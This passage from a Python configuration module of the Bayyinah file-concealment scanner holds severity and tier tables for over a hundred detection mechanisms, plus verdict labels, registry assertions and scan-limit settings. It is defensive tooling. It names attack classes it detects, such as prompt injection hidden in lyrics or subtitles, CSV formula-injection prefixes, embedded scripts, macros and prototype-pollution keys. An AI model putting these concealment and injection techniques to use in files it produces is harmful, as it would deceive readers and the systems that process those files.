    "video_metadata_suspicious":      0.25,
    "video_embedded_attachment":      0.40,
    "video_frame_stego_candidate":    0.25,
    "video_container_anomaly":        0.20,
    "video_cross_stem_divergence":    0.15,
    # -----------------------------------------------------------------
    # Phase 24 — audio (MP3 / WAV / FLAC / M4A / OGG).
    # -----------------------------------------------------------------
    # Calibration (Al-Baqarah 2:143 — the middle community):
    # * The stem inventory is non-deducting — meta-output only.
    # * Identity-anomaly ranks highest (0.40). Al-Nisa 4:112 — voice-
    #   cloned fabrication attributed to a speaker is tazwir of the
    #   gravest kind; the mechanism that surfaces that specific
    #   shape carries the highest audio-family severity.
    # * Lyrics prompt-injection and metadata-injection follow the
    #   zahir-text-family calibration — 0.35 / 0.30 matches the
    #   subtitle family on video.
    # * Embedded-payload carries the attachment-family weight (0.40)
    #   since it pulls in arbitrary file-format payloads (PE / script
    #   / image with LSB).
    # * LSB-stego candidate is probabilistic — a real recording's
    #   silence sections legitimately produce uniform LSB; the
    #   mechanism deducts modestly (0.20) and is tier 2 structural.
    # * High-entropy metadata, container anomaly, and cross-stem
    #   divergence are structural shapes whose adversarial reading
    #   depends on context (0.20 / 0.20 / 0.15).
    "audio_stem_inventory":           0.00,
    "audio_metadata_identity_anomaly": 0.40,
    "audio_lyrics_prompt_injection":  0.35,
    "audio_metadata_injection":       0.30,
    "audio_embedded_payload":         0.40,
    "audio_lsb_stego_candidate":      0.20,
    "audio_high_entropy_metadata":    0.20,
    "audio_container_anomaly":        0.20,
    "audio_cross_stem_divergence":    0.15,
    # -----------------------------------------------------------------
    # Phase 25+ — cross-modal correlation.
    # -----------------------------------------------------------------
    # * The inventory is a meta-finding — non-deducting, informational
    #   (matches audio_stem_inventory / video_stream_inventory).
    # * Undeclared-text is tier 2 structural; the shape is unambiguous
    #   (subtitle text + silent metadata) but whether the divergence
    #   is adversarial depends on context. Severity 0.25 matches
    #   video_metadata_suspicious — the cross-stem analogue.
    "cross_stem_inventory":           0.00,
    "cross_stem_undeclared_text":     0.25,
    # -----------------------------------------------------------------
    # v1.1.2 Day 2 - PDF concealment closures (zahir + batin parallel
    # passes; pdf_off_page_text is zahir per its content-stream-
    # observable signal, paralleling the existing zahir off_page_text).
    # -----------------------------------------------------------------
    # Per Day 2 prompt section 6.6 step 2, new Tier 1 mechanisms ship
    # with severity 1.0 and new Tier 2 mechanisms with severity 0.5.
    # This is sharper than the v1.1.1 calibration ladder (Tier 1
    # historically 0.10-0.40) but matches the Defense Case F1 stance
    # that an unambiguous concealment finding warrants a full
    # deduction. The signal class for these mechanisms is structural
    # and free of legitimate-document false positives in v1.1.2's
    # tested corpus, so the full-deduction calibration does not
    # imply false positives on benign files.
    "pdf_off_page_text":              1.00,
    "pdf_metadata_analyzer":          1.00,
    "pdf_trailer_analyzer":           0.50,
    "pdf_hidden_text_annotation":     1.00,
    # -----------------------------------------------------------------
    # v1.1.2 - Tier 0 routing transparency.
    # -----------------------------------------------------------------
    # format_routing_divergence is non-deducting (severity 0.0) because
    # it does not claim concealment - it claims uncertainty about which
    # analyzer should have run. The verdict floor at mughlaq is the
    # honest disclosure; pulling the integrity score down on top of that
    # would double-count the same epistemic gap. The verdict resolver
    # in domain.value_objects.tamyiz_verdict applies the floor by
    # short-circuiting to VERDICT_MUGHLAQ when any Tier 0 finding is
    # present.
    "format_routing_divergence":      0.00,
}

# Default severity for any unknown mechanism — mirrors v0 behaviour.
DEFAULT_SEVERITY: Final[float] = 0.05


# ---------------------------------------------------------------------------
# Validity tier by mechanism
# ---------------------------------------------------------------------------
# 1 — Verified: mechanism unambiguously identifiable; presence = concealment
# 2 — Structural: pattern of concealment, could be benign in rare cases
# 3 — Interpretive: suspicious, heavily context-dependent

TIER: Final[dict[str, int]] = {
    "invisible_render_mode": 1,
    "white_on_white_text":   1,
    "microscopic_font":      2,
    "off_page_text":         2,
    "zero_width_chars":      2,
    "bidi_control":          2,
    "tag_chars":             1,
    "overlapping_text":      2,
    "homoglyph":             2,
    "javascript":            1,
    "openaction":            2,
    "additional_actions":    2,
    "launch_action":         1,
    "embedded_file":         2,
    "file_attachment_annot": 2,
    "incremental_update":    3,
    "metadata_anomaly":      3,
    "hidden_ocg":            2,
    "tounicode_anomaly":     1,
    # Phase 9 — structural concealment in non-PDF formats.
    "duplicate_keys":        2,
    "excessive_nesting":     3,
    "extension_mismatch":    2,
    # Phase 10 — image/SVG.
    # svg_embedded_script is tier 1 because a <script> element in an SVG
    # is verified active content the moment any renderer with scripting
    # enabled opens it — the concealment is unambiguous. trailing_data,
    # suspicious_image_chunk, SVG external refs / data URIs / foreign
    # objects are tier 2 (structural pattern; could in rare cases be
    # benign tooling output). oversized_metadata is tier 2 at the
    # chosen threshold (64 KB). image_text_metadata is tier 3 because
    # the *presence* of metadata text is routine — we surface it so the
    # reader can inspect, but escalation depends on what it contains.
    "trailing_data":            2,
    "suspicious_image_chunk":   3,
    "oversized_metadata":       2,
    "image_text_metadata":      3,
    "svg_embedded_script":      1,
    "svg_event_handler":        2,
    "svg_external_reference":   2,
    "svg_embedded_data_uri":    2,
    "svg_foreign_object":       2,
    # Phase 11 — depth additions.
    # mathematical_alphanumeric: tier 2 structural (a cross-script payload
    # is a pattern of concealment, though legit math typesetting exists).
    # svg_hidden_text: tier 2 — DOM presence + CSS-enforced invisibility
    # is structural concealment, not verified intent.
    # svg_microscopic_text: tier 2 — parallels microscopic_font (also 2).
    # suspected_lsb_steganography: tier 3 — the LSB-uniformity signature
    # is a necessary but not sufficient indicator; we surface the signal
    # for the reader's interpretation.
    # high_entropy_metadata: tier 2 — a cryptographic payload inside a
    # text metadata field is a pattern, not a proof of malice.
    # multiple_idat_streams: tier 3 — structural oddity; standard encoders
    # don't do this, but the pattern alone isn't a verdict.
    "mathematical_alphanumeric":   2,
    "svg_hidden_text":             2,
    "svg_microscopic_text":        2,
    "suspected_lsb_steganography": 3,
    "high_entropy_metadata":       2,
    "multiple_idat_streams":       3,
    # Phase 12 — cross-modal correlation + generative cryptography.
    # coordinated_concealment is tier 2 (structural): the same byte string
    # hidden in two different carrier layers is a pattern of concealment,
    # not a verdict. A legitimate tooling pipeline could in principle
    # embed the same string twice; the tier leaves room for that reading.
    # generative_cipher_signature is tier 2: cipher-shaped blobs are a
    # recognised pattern but not a proof of malice (a certificate payload
    # could legitimately live in image metadata).
    # cross_format_payload_match is tier 2 for the same reason — a shared
    # string across files is coordination shape, not intent.
    "coordinated_concealment":     2,
    "generative_cipher_signature": 2,
    "cross_format_payload_match":  2,
    # Phase 15 — DOCX mechanisms.
    # docx_hidden_text: tier 2 — the vanish attribute is unambiguously
    # present, but Word supports it for legitimate outlining / drafts;
    # the concealment is a structural pattern, not a verified
    # adversarial artifact.
    # docx_vba_macros: tier 1 — a ``vbaProject.bin`` entry IS active
    # macro code the moment the user enables it; the pattern is
    # verified, not merely structural. Parallels PDF javascript (also
    # tier 1).
    # docx_embedded_object: tier 2 — embedded OLE / alt-format files
    # are a structural pattern; a document could legitimately embed a
    # spreadsheet or chart.
    # docx_alt_chunk: tier 2 — altChunk is rare in legitimate
    # documents but valid in some editor workflows; structural.
    # docx_external_relationship: tier 2 — external refs are a
    # pattern; a document could legitimately link to an external
    # resource.
    # docx_revision_history: tier 3 — the presence of tracked changes
    # is not itself adversarial; the reader must consult the prior
    # revision to judge what the change concealed. Parallels PDF
    # incremental_update (also tier 3).
    "docx_hidden_text":            2,
    "docx_vba_macros":             1,
    "docx_embedded_object":        2,
    "docx_alt_chunk":              2,
    "docx_external_relationship":  2,
    "docx_revision_history":       3,
    # Phase 17 (v1.1.2) — DOCX hidden-text payload mechanisms.
    "docx_white_text":             1,
    "docx_microscopic_font":       2,
    "docx_header_footer_payload": 1,
    "docx_metadata_payload":       1,
    "docx_comment_payload":        2,
    "docx_orphan_footnote":        1,
    # Phase 16 — HTML mechanisms.
    # html_hidden_text: tier 2 structural — CSS / attribute-based
    #   invisibility is unambiguously present, but Word-style drafts
    #   and accessibility-helpers (sr-only classes) legitimately use
    #   the same primitives, so we stop short of tier 1.
    # html_inline_script: tier 1 verified — a ``<script>`` tag or
    #   ``on*`` handler *is* executable content; parallels PDF
    #   javascript (tier 1) and svg_embedded_script (tier 1).
    # html_data_attribute: tier 3 interpretive — data- attrs are
    #   routine on modern web pages; we surface length-suspect ones
    #   for reader interpretation rather than assert concealment.
    # html_external_reference: tier 2 structural — same reasoning as
    #   svg_external_reference / docx_external_relationship.
    "html_hidden_text":            2,
    "html_inline_script":          1,
    "html_data_attribute":         3,
    "html_external_reference":     2,
    # Phase 17 — XLSX mechanisms.
    # xlsx_vba_macros: tier 1 verified active code (parallels
    #   docx_vba_macros, svg_embedded_script, PDF javascript).
    # xlsx_embedded_object: tier 2 structural (parallels
    #   docx_embedded_object).
    # xlsx_revision_history: tier 3 interpretive (parallels
    #   docx_revision_history and PDF incremental_update — the
    #   preserved prior state is not itself adversarial, but reveals
    #   concealed earlier content).
    # xlsx_hidden_sheet: tier 2 structural (parallels
    #   docx_hidden_text — Word supports vanish for legitimate drafts;
    #   Excel supports hidden sheets for legitimate data panels).
    # xlsx_hidden_row_column: tier 2 structural (same reasoning;
    #   hidden rows/cols are routine in legitimate reports, so we
    #   surface without tier-1 verdict).
    # xlsx_external_link: tier 2 structural (parallels
    #   docx_external_relationship).
    # xlsx_data_validation_formula: tier 3 interpretive — a formula in
    #   a validation rule is a carrier shape, not a proof of malice.
    "xlsx_vba_macros":                1,
    "xlsx_embedded_object":           2,
    "xlsx_revision_history":          3,
    "xlsx_hidden_sheet":              2,
    "xlsx_hidden_row_column":         2,
    "xlsx_external_link":             2,
    "xlsx_data_validation_formula":   3,
    # Phase 17 (v1.1.2) - XLSX hidden-text payload mechanisms.
    "xlsx_white_text":                1,
    "xlsx_microscopic_font":          2,
    "xlsx_csv_injection_formula":     1,
    "xlsx_metadata_payload":          1,
    "xlsx_defined_name_payload":      2,
    "xlsx_comment_payload":           2,
    # Phase 16 (v1.1.2) - HTML format-gauntlet payload mechanisms.
    # All six are Tier 1 verified - each trigger is a byte-
    # deterministic structural anomaly (length threshold or
    # substring divergence) with no semantic claim about user
    # intent.
    "html_noscript_payload":          1,
    "html_template_payload":          1,
    "html_comment_payload":           1,
    "html_meta_payload":              1,
    "html_style_content_payload":     1,
    "html_title_text_divergence":     1,
    # Phase 18 — PPTX mechanisms.
    # pptx_vba_macros: tier 1 verified active code (parallels
    #   docx_vba_macros, xlsx_vba_macros, svg_embedded_script).
    # pptx_embedded_object: tier 2 structural (parallels
    #   docx_embedded_object, xlsx_embedded_object).
    # pptx_hidden_slide: tier 2 structural (parallels
    #   xlsx_hidden_sheet — PowerPoint supports hidden slides for
    #   legitimate backup / appendix usage; we surface without a
    #   tier-1 verdict).
    # pptx_speaker_notes_injection: tier 3 interpretive — the notes
    #   part exists for legitimate speaker reference. The finding
    #   surfaces the shape (notes content with concealment class) for
    #   reader interpretation rather than asserting malice.
    # pptx_revision_history: tier 3 interpretive (parallels
    #   docx_revision_history, xlsx_revision_history, PDF
    #   incremental_update).
    # pptx_slide_master_injection: tier 2 structural — masters
    #   legitimately carry branding text (logos, footers), but a
    #   content-shaped text run in a master is the suspect pattern.
    # pptx_external_link: tier 2 structural (parallels
    #   docx_external_relationship, xlsx_external_link).
    # pptx_action_hyperlink: tier 2 structural — action URIs are
    #   valid PowerPoint features (jump-to-slide, launch-application);
    #   we surface the dispatch shape without a tier-1 verdict.
    # pptx_custom_xml_payload: tier 3 interpretive (custom XML is
    #   legitimately used for document-data binding).
    "pptx_vba_macros":                1,
    "pptx_embedded_object":           2,
    "pptx_hidden_slide":              2,
    "pptx_speaker_notes_injection":   3,
    "pptx_revision_history":          3,
    "pptx_slide_master_injection":    2,
    "pptx_external_link":             2,
    "pptx_action_hyperlink":          2,
    "pptx_custom_xml_payload":        3,
    # Phase 19 — EML mechanisms.
    # eml_executable_attachment: tier 1 verified active code (parallels
    #   docx_vba_macros, svg_embedded_script, PDF javascript).
    # eml_macro_attachment: tier 1 — a macro-enabled Office attachment
    #   IS code pending one confirmation click. The inner analyzer will
    #   fire per-format mechanisms when the attachment is recursively
    #   scanned; the outer envelope-level finding is still tier 1.
    # eml_multipart_alternative_divergence: tier 2 structural — the two
    #   renderings might legitimately differ (an HTML part may add
    #   markup the plain-text part lacks), so the divergence we flag is
    #   material content divergence, not mere formatting. Structural
    #   pattern, not verified adversarial intent.
    # eml_hidden_html_content: tier 2 structural (parallels
    #   html_hidden_text).
    # eml_display_name_spoof: tier 2 structural — a display name that
    #   performs a trusted identity while the envelope address sits in
    #   an unrelated domain is a pattern of concealment, not a verified
    #   verdict (internal routing can legitimately rewrite addresses in
    #   some deployments).
    # eml_encoded_subject_anomaly: tier 2 structural — an RFC 2047
    #   encoded-word carrying a concealment-class codepoint in its
    #   decoded content is a pattern; legitimate i18n uses encoded-words
    #   without smuggling.
    # eml_external_reference: tier 2 structural (parallels
    #   html_external_reference, docx_external_relationship, etc.).
    # eml_smuggled_header: tier 2 structural — duplicate
    #   single-instance headers or embedded CRLF in a header value is a
    #   pattern (some mail pipelines legitimately emit duplicates in
    #   pathological cases); the shape is suspicious but not
    #   unambiguous.
    # eml_attachment_present: tier 3 interpretive — attachments are
    #   routine. Surfaced for the reader's context, not as a verdict.
    # eml_nested_eml: tier 3 interpretive — forwards legitimately nest
    #   messages. The inner findings are what the reader should look at.
    # eml_mime_boundary_anomaly: tier 3 interpretive — boundary shape
    #   is a subtle shape; tolerant parsers disagree on what counts.
    "eml_executable_attachment":              1,
    "eml_macro_attachment":                   1,
    "eml_multipart_alternative_divergence":   2,
    "eml_hidden_html_content":                2,
    "eml_display_name_spoof":                 2,
    "eml_encoded_subject_anomaly":            2,
    "eml_external_reference":                 2,
    "eml_smuggled_header":                    2,
    "eml_attachment_present":                 3,
    "eml_nested_eml":                         3,
    "eml_mime_boundary_anomaly":              3,
    # v1.1.2 EML format-gauntlet tiers. Mismatch / chain-anomaly
    # mechanisms are tier-2 structural (deterministic comparison; the
    # interpretation — phishing, CEO fraud — is not made by the
    # detector). base64-on-text, folded-continuation, and X-* length
    # mechanisms are tier-1 verified (deterministic checks on raw
    # bytes, no semantic claims).
    "eml_from_replyto_mismatch":              2,
    "eml_base64_text_part":                   1,
    "eml_returnpath_from_mismatch":           2,
    "eml_received_chain_anomaly":             2,
    "eml_header_continuation_payload":        1,
    "eml_xheader_payload":                    1,
    "image_jpeg_appn_payload":                1,
    "image_png_private_chunk":                2,
    "image_png_text_chunk_payload":           1,
    "svg_white_text":                         1,
    "svg_title_payload":                      1,
    "svg_desc_payload":                       1,
    "svg_metadata_payload":                   1,
    "svg_defs_unreferenced_text":             1,
    # Phase 20 — CSV / TSV / delimited-data mechanism tiers. Rationale:
    # csv_formula_injection: tier 1 verified — the first-byte prefix is
    #   unambiguously identifiable (``=``, ``+``, ``-``, ``@``, ``\t``,
    #   ``\r`` at the start of a cell) and the OWASP-documented payload
    #   shape executes in the spreadsheet app on open. No benign reading.
    # csv_null_byte: tier 1 verified — a NUL inside a data field has no
    #   legitimate reading in any real-world CSV dialect; it is a pure
    #   format-confusion / parser-truncation vector.
    # (Per-cell Unicode concealment uses the shared generic mechanisms
    #  already tiered above — zero_width_chars (2), tag_chars (1),
    #  bidi_control (2), homoglyph (2). No CSV-specific tier needed.)
    # csv_comment_row: tier 2 structural — `#`-prefixed rows are common
    #   in legitimate exports (R, awk, some SQL dumps), but the parser
    #   divergence is real: some readers silently skip, others carry.
    # csv_inconsistent_columns: tier 2 structural — ragged rows can be
    #   benign (trailing-comma omission) or adversarial (payload hidden
    #   in an unexpected extra column).
    # csv_bom_anomaly: tier 2 structural — BOM at file start is normal;
    #   BOM embedded mid-stream, or a single BOM that causes a header
    #   cell to misread, is the concealment shape.
    # csv_mixed_encoding: tier 2 structural — byte sequences valid as
    #   both UTF-8 and Latin-1 but decoding to different glyphs is a
    #   real concealment vector; some legitimate legacy exports also
    #   land here, so structural rather than verified.
    # csv_mixed_delimiter: tier 2 structural — inconsistent delimiters
    #   across rows (tab in some, comma in others) is the classic
    #   parser-splitting shape 2:14 in structured form.
    # csv_quoting_anomaly: tier 3 interpretive — unbalanced or mixed
    #   quoting is often sloppy export rather than adversarial intent.
    # csv_oversized_field: tier 3 interpretive — a megabyte-scale cell
    #   is suspicious but legitimate log exports hit this threshold.
    "csv_formula_injection":          1,
    "csv_bidi_payload":               1,
    "json_unicode_escape_payload":    1,
    "json_comment_anomaly":           2,
    "json_prototype_pollution_key":   1,
    "json_nested_payload":            2,
    "json_trailing_payload":          1,
    "csv_null_byte":                  1,
    "csv_comment_row":                2,
    "csv_inconsistent_columns":       2,
    "csv_column_type_drift":          2,
    "csv_quoted_newline_payload":     1,
    "csv_zero_width_payload":         1,
    "csv_encoding_divergence":        1,
    "csv_bom_anomaly":                2,
    "csv_mixed_encoding":             2,
    "csv_mixed_delimiter":            2,
    "csv_quoting_anomaly":            3,
    "csv_oversized_field":            3,
    # Phase 21 — production-hardening meta-mechanisms. Tier 3
    # (interpretive) for both: the scanner is surfacing the shape of
    # its *own* limitation rather than asserting a concealment
    # pattern in the file. The reader decides whether an unknown
    # format or a limit-clipped scan is adversarial in their context.
    "unknown_format":        3,
    "scan_limited":          3,
    "scan_error":            3,
    # -----------------------------------------------------------------
    # Phase 24 — video (MP4 / MOV / WEBM / MKV).
    # -----------------------------------------------------------------
    # * Subtitle-text concealment uses verified codepoint evidence
    #   (zero-width / bidi / TAG) identical to what ZahirTextAnalyzer
    #   emits — tier 1.
    # * Subtitle injection (script-shape text) is also tier 1 when the
    #   pattern is a literal ``<script>`` or ``javascript:`` URL; the
    #   analyzer only fires on those high-confidence shapes.
    # * Embedded attachments and container anomalies are tier 2
    #   structural — the attachment is unambiguously present, but its
    #   adversarial reading depends on what the attachment carries.
    # * Metadata-suspicious, frame-stego-candidate, and cross-stem-
    #   divergence are tier 2 structural — the signal is clear
    #   (codepoint, statistic, divergence) but context-dependent.
    # * Stream inventory is tier 3 interpretive — informational only.
    "video_stream_inventory":         3,
    "subtitle_injection":             1,
    "subtitle_invisible_chars":       1,
    "video_metadata_suspicious":      2,
    "video_embedded_attachment":      2,
    "video_frame_stego_candidate":    2,
    "video_container_anomaly":        2,
    "video_cross_stem_divergence":    3,
    # -----------------------------------------------------------------
    # Phase 24 — audio (MP3 / WAV / FLAC / M4A / OGG).
    # -----------------------------------------------------------------
    # * Lyrics-injection and metadata-injection use verified codepoint
    #   / script-pattern evidence — tier 1 (same treatment as
    #   subtitle_* on video).
    # * Identity-anomaly is tier 2 structural — the field mismatch is
    #   unambiguously present, but whether the file is adversarial
    #   depends on whether the provenance gap was deliberate.
    # * Embedded-payload is tier 2 (the attachment is present; the
    #   payload's adversarial reading rides on what it carries).
    # * LSB-stego-candidate is tier 2 probabilistic — uniform LSBs
    #   appear in genuine silence too.
    # * High-entropy-metadata, container-anomaly, cross-stem-
    #   divergence are tier 2 structural, interpretive reading.
    # * Inventory is tier 3 informational.
    "audio_stem_inventory":           3,
    "audio_metadata_identity_anomaly": 2,
    "audio_lyrics_prompt_injection":  1,
    "audio_metadata_injection":       1,
    "audio_embedded_payload":         2,
    "audio_lsb_stego_candidate":      2,
    "audio_high_entropy_metadata":    2,
    "audio_container_anomaly":        2,
    "audio_cross_stem_divergence":    3,
    # -----------------------------------------------------------------
    # Phase 25+ — cross-modal correlation.
    # -----------------------------------------------------------------
    # * Inventory is tier 3 informational (matches the pattern set
    #   by video_stream_inventory / audio_stem_inventory).
    # * Undeclared-text is tier 2 structural — the shape is
    #   unambiguously present (subtitle text exists; metadata is
    #   silent), but the adversarial reading depends on context
    #   (a legitimate video may genuinely lack a caption tag).
    "cross_stem_inventory":           3,
    "cross_stem_undeclared_text":     2,
    # -----------------------------------------------------------------
    # v1.1.2 Day 2 - PDF concealment closures (Tier classifications).
    # -----------------------------------------------------------------
    "pdf_off_page_text":              1,
    "pdf_metadata_analyzer":          1,
    "pdf_trailer_analyzer":           2,
    "pdf_hidden_text_annotation":     1,
    # -----------------------------------------------------------------
    # v1.1.2 - Tier 0 routing transparency.
    # -----------------------------------------------------------------
    # format_routing_divergence is Tier 0: it does not claim concealment,
    # it claims uncertainty about which analyzer should have run. The
    # verdict resolver floors at mughlaq when this finding is present.
    "format_routing_divergence":      0,
}


# ---------------------------------------------------------------------------
# Scan-incomplete clamp
# ---------------------------------------------------------------------------

# When the scan did not fully cover the document (scanner error, or any
# finding with mechanism == scan_error), clamp the integrity score to at
# most this value. Absence of findings in an uninspected region cannot be
# taken as evidence of cleanness.
SCAN_INCOMPLETE_CLAMP: Final[float] = 0.5


# ---------------------------------------------------------------------------
# Verdict labels (tamyiz)
# ---------------------------------------------------------------------------

Verdict = Literal["sahih", "mushtabih", "mukhfi", "munafiq", "mughlaq"]
"""Verdict labels used by ``tamyiz_verdict``.

sahih      — sound; score == 1.0, no findings, scan complete.
mushtabih  — suspicious; score in [0.7, 1.0), some concealment signal
             but nothing verified unambiguously.
mukhfi     — concealment detected; score in [0.3, 0.7).
munafiq    — severe concealment; score < 0.3 AND at least one tier-1
             finding (verified concealment mechanism present).
mughlaq    — closed / withheld; scan_incomplete is true or an error
             occurred, no verdict can be issued from an unfinished scan.

NB: These labels classify the *report*, not the document's author or
intent. Bayyinah surfaces the gap between surface and content; it does
not self-validate a moral judgement. The reader performs the recognition.
"""

VERDICT_SAHIH: Final[Verdict] = "sahih"
VERDICT_MUSHTABIH: Final[Verdict] = "mushtabih"
VERDICT_MUKHFI: Final[Verdict] = "mukhfi"
VERDICT_MUNAFIQ: Final[Verdict] = "munafiq"
VERDICT_MUGHLAQ: Final[Verdict] = "mughlaq"


# ---------------------------------------------------------------------------
# Tier legend — exposed verbatim in IntegrityReport.to_dict output.
# ---------------------------------------------------------------------------

TIER_LEGEND: Final[dict[str, str]] = {
    "1": "Verified — unambiguous concealment",
    "2": "Structural — pattern of concealment, context may justify",
    "3": "Interpretive — suspicious, context-dependent",
}

# v1.1.2 - the full tier legend including Tier 0 (routing transparency).
# Kept separate from TIER_LEGEND because TIER_LEGEND is embedded in
# IntegrityReport.to_dict for v0/v0.1 byte-parity. The full legend is
# what the api.py /scan response surfaces alongside the report; in-
# process callers and the test suite consume it via this name. A Tier 0
# finding never appears in a report whose to_dict is asserted byte-
# identical to v0/v0.1, so the legend that travels with such reports
# does not need a Tier 0 entry.
TIER_LEGEND_FULL: Final[dict[str, str]] = {
    "0": "Routing - meta-evidence about the scanner's routing decision; floors verdict at mughlaq",
    **TIER_LEGEND,
}

# Verbatim disclaimer exposed in IntegrityReport.to_dict output.
VERDICT_DISCLAIMER: Final[str] = (
    "This report presents observed mechanisms and their validity tiers. "
    "It does NOT self-validate a moral or malicious verdict. The scanner "
    "makes the invisible visible; the reader performs the recognition."
)


# ---------------------------------------------------------------------------
# Tool identity — reproduced in IntegrityReport.to_dict output.
# ---------------------------------------------------------------------------

TOOL_NAME: Final[str] = "bayyinah"
# TOOL_VERSION is the in-process module identity. It has been frozen at
# "0.1.0" since v0 because IntegrityReport.to_dict embeds it, and any
# change here would break the byte-parity invariant the PDF analyzer
# inherits from bayyinah_v0_1 (which hardcodes "0.1.0" in its own
# Finding.to_dict shape). The five-surface version coherence named in
# v1.1.2 success criterion #2 (/scan, /version, /healthz, OpenAPI,
# pyproject) is achieved at the api.py layer instead - api.py imports
# bayyinah.__version__ (which IS 1.1.2) for its response shape, while
# leaving TOOL_VERSION untouched so the in-process to_dict surface
# stays byte-identical to v0/v0.1.
TOOL_VERSION: Final[str] = "0.1.0"


# ---------------------------------------------------------------------------
# MECHANISM_REGISTRY — the single auditable mechanism set
# ---------------------------------------------------------------------------
#
# Every mechanism Bayyinah emits is in exactly one of three sets above
# (ZAHIR_MECHANISMS, BATIN_MECHANISMS, or ROUTING_MECHANISMS) and has
# exactly one entry in the SEVERITY and TIER tables. The four views
# are kept in lockstep by the import-time assertion below. Exposing the
# union as a single public symbol makes the count auditable from one
# import:
#
#     >>> from bayyinah import MECHANISM_REGISTRY
#     >>> len(MECHANISM_REGISTRY)
#     109
#
# The assertion at module import time means the file cannot load if
# any of the five tables (ZAHIR, BATIN, ROUTING, SEVERITY, TIER) drift
# apart. This converts a documentation claim ("109 mechanisms - 27
# zahir + 81 batin + 1 routing, every one with SEVERITY and TIER")
# into a structural invariant: the file fails to import if the claim
# is false. This is the Mizan calibration table made externally
# inspectable. Tier 0 ROUTING mechanisms are tracked alongside zahir
# and batin so the registry coherence assertion covers the whole
# mechanism universe, not just concealment findings.

MECHANISM_REGISTRY: Final[frozenset[str]] = (
    ZAHIR_MECHANISMS | BATIN_MECHANISMS | ROUTING_MECHANISMS
)

assert len(MECHANISM_REGISTRY) == (
    len(ZAHIR_MECHANISMS) + len(BATIN_MECHANISMS) + len(ROUTING_MECHANISMS)
), (
    "ZAHIR_MECHANISMS, BATIN_MECHANISMS, and ROUTING_MECHANISMS must be "
    "pairwise disjoint - every mechanism belongs to exactly one layer"
)
assert set(SEVERITY.keys()) == MECHANISM_REGISTRY, (
    f"SEVERITY drift: missing="
    f"{MECHANISM_REGISTRY - set(SEVERITY.keys())}, "
    f"orphan={set(SEVERITY.keys()) - MECHANISM_REGISTRY}"
)
assert set(TIER.keys()) == MECHANISM_REGISTRY, (
    f"TIER drift: missing={MECHANISM_REGISTRY - set(TIER.keys())}, "
    f"orphan={set(TIER.keys()) - MECHANISM_REGISTRY}"
)


# ---------------------------------------------------------------------------
# Phase 21 — Configurable safety limits (Al-Baqarah 2:286).
# ---------------------------------------------------------------------------
#
#     لَا يُكَلِّفُ اللَّهُ نَفْسًا إِلَّا وُسْعَهَا
#     "Allah does not burden a soul beyond its capacity."
#
# The architectural reading: the scanner must not burden itself beyond its
# configured capacity. An uncapped CSV row loop on a 200 GB file, an
# unbounded .eml attachment recursion on a mail-storm archive, a
# PDF-extracted text buffer that runs out of memory — all of these turn
# Bayyinah from an integrity witness into a denial-of-service vector.
#
# ``ScanLimits`` is the one place those ceilings are declared. Every
# analyzer reads ``get_current_limits()`` when deciding whether to halt
# a per-item loop; ``ScanService`` enforces ``max_file_size_bytes`` as
# a pre-flight before any analyzer runs. Limits are *graceful*: when an
# analyzer hits a limit it emits a ``scan_limited`` finding (tier 3,
# severity 0.0 — non-deducting, but the clamp still applies because the
# scan was incomplete), records ``scan_incomplete=True``, and returns the
# findings it already has. It never raises.
#
# The limits dataclass is frozen (immutable per instance). Callers
# reconfigure by constructing a new instance and passing it to
# ``ScanService(limits=...)`` or by calling ``set_current_limits()`` /
# using the ``limits_context()`` context manager.

import threading
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Iterator


@dataclass(frozen=True)
class ScanLimits:
    """Configured safety ceilings that analyzers read at scan time.

    All limits are positive integers. Zero is treated as "no limit" for
    the per-item ceilings (``max_csv_rows``, ``max_eml_attachments``,
    ``max_recursion_depth``, ``max_field_length``); this is the escape
    hatch callers use when they explicitly want unbounded scanning on
    trusted input. ``max_file_size_bytes`` is a hard refuse-to-open
    ceiling and must be positive — a zero here would refuse every file
    and is rejected at construction time.

    Fields
    ------
    max_file_size_bytes
        Hard ceiling on the size of any file Bayyinah will attempt to
        open. Enforced by ``ScanService`` before any analyzer runs.
        Files larger than this are short-circuited with a single
        ``scan_limited`` finding and ``scan_incomplete=True``. Default
        256 MB — big enough for every format Bayyinah supports in
        practice, small enough to prevent a pathological input from
        exhausting memory on a small scanner host.

    max_recursion_depth
        Depth ceiling for analyzers that recurse into nested carriers
        (today: ``EmlAnalyzer`` recursing into ``message/rfc822``
        attachments). Default 5 — deeper than any real forwarding
        chain, shallow enough to prevent an infinite-recursion EML
        denial-of-service. Historical hard-coded value in
        ``eml_analyzer.py`` was 3; the default here raises that to 5
        while exposing it as configurable (additive: a caller who
        wants the old behaviour constructs ``ScanLimits(
        max_recursion_depth=3)``).

    max_csv_rows
        Row-count ceiling for ``CsvAnalyzer._walk_rows``. Default
        200 000 — matches the prior module-level ``_MAX_ROWS``
        constant exactly so existing tests are byte-identical. The
        limit exists because a CSV-bomb (a single row with millions
        of delimited fields, or a genuine multi-GB export) can
        consume the row loop's working set past reason. When the
        ceiling is hit the analyzer appends a ``scan_limited``
        finding and stops.

    max_field_length
        Byte-length ceiling for a single CSV field before the analyzer
        stops inspecting it. Default 4 MiB — four times the prior
        1 MiB ``csv_oversized_field`` threshold, so the existing
        structural finding still fires first on the usual adversarial
        shapes; ``scan_limited`` triggers only on the extreme tail
        (a field several megabytes long that we refuse to fully
        re-scan for Unicode concealment).

    max_eml_attachments
        Attachment-count ceiling for ``EmlAnalyzer``. Default 64 —
        well above the legitimate per-message attachment count (a
        well-designed mail interface refuses more than a dozen), low
        enough that a crafted message with thousands of zero-byte
        parts cannot drive the analyzer's per-attachment work to
        pathological levels. When exceeded the analyzer emits
        ``scan_limited`` and returns the findings already gathered.
    """

    max_file_size_bytes: int = 256 * 1024 * 1024     # 256 MB
    max_recursion_depth: int = 5
    max_csv_rows: int = 200_000
    max_field_length: int = 4 * 1024 * 1024           # 4 MiB
    max_eml_attachments: int = 64

    def __post_init__(self) -> None:
        """Reject structurally-invalid limit sets at construction time.

        ``max_file_size_bytes`` must be positive — a zero or negative
        value would refuse every file, which is not a configuration
        anyone wants. The per-item ceilings accept zero (meaning
        "no limit") but reject negatives.
        """
        if self.max_file_size_bytes <= 0:
            raise ValueError(
                "max_file_size_bytes must be positive "
                f"(got {self.max_file_size_bytes}); use a large value "
                "instead of zero if you want effectively unbounded."
            )
        for field_name in (
            "max_recursion_depth",
            "max_csv_rows",
            "max_field_length",
            "max_eml_attachments",
        ):
            value = getattr(self, field_name)
            if value < 0:
                raise ValueError(
                    f"{field_name} must be non-negative (got {value}); "
